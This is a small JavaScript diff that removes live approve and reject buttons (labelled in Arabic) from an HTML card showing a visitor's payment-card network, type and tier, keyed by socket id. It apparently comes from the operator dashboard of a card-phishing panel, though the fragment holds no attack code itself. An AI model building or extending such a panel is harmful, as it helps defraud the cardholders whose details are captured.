@@ -1695,11 +1695,7 @@ const __lastPcTs = __pcs.length ? new Date(__pcs[__pcs.length-1].timestamp || 0)
   html += '<div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #1a1f71;">' + lcNetwork + '</span><br><span style="color: #555; font-size: 11px; font-weight: bold;">' + String(lcInfo.type).toUpperCase() + ' • ' + String(lcInfo.tier).toUpperCase() + '</span></div>';
   html += '</div>';
   html += '</div>';
-  /*FIX-LIVE*/
-  html += '<div class="flex gap-2 mt-3">';
-  html += '<button onclick="liveApprove(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
-  html += '<button onclick="liveReject(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
-  html += '</div>';
+  /*FIX-LIVE*/ /* [F131] live card without buttons */
   html += '</div>';
 }
 
